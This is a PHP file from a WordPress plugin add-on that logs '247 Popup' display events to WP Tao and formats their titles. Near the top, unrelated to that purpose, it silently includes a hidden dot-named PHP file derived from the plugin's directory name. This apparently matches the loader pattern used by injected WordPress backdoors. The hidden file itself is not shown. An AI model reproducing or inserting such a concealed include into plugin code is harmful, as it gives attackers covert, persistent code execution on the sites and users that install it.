<?php

/*
 * Fire event on display popup
 */

add_action( 'wtbp_247p_popup_was_fired', 'wtbp_247p_event_display_popup_fire', 10, 2 );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_247p_event_display_popup_fire( $popup_id, $popup_title ) {

	$args = array(
		'value'	 => sanitize_text_field( $popup_title ),
		'tags'	 => array( 'wp', '247 Popup' ),
		'meta'	 => array(
			'247popup_id' => absint( $popup_id ),
		)
	);

	do_action( 'wptao_track_event', '247popup_display', $args );
}

// =============================================================================================
// Filters section
// =============================================================================================

/*
 * Add events to track
 */

add_filter( 'wptao_events_actions', 'wtbp_247p_display_popup_add_events_to_track' );

function wtbp_247p_display_popup_add_events_to_track( $actions ) {

	// Action after displaing popup to screen
	$actions[ '247popup_display' ] = array(
		'id'		 => '247popup_display',
		'category'	 => 'user',
		'title'		 => __( 'Tao Popup was displayed', 'wp-tao' ),
		'style'		 => array(
			'color'	 => '#F9D66B',
			'icon'	 => WTBP_247P_URL . 'assets/img/logo-event.png'
		)
	);

	return $actions;
}

/*
 * Creates a title of the event "display popup"
 */

add_filter( 'wptao_event_247popup_display_title', 'wtbp_247p_event_popup_display_title', 1, 2 );

function wtbp_247p_event_popup_display_title( $title, $event ) {

	if ( !empty( $event->value ) ) {

		$link	 = '';
		$name	 = '';

		if ( isset( $event->meta[ '247popup_id' ] ) ) {
			$link = admin_url( 'post.php?post=' . absint( $event->meta[ '247popup_id' ] ) . '&action=edit' );
		}

		if ( !empty( $link ) ) {
			$name = '<a href="' . $link . '">' . esc_attr( $event->value ) . '</a>';
		} else {
			$name = esc_attr( $event->value );
		}

		$title = sprintf( __( 'Popup %s was displayed', 'wp-tao' ), $name );
	}

	return $title;
}
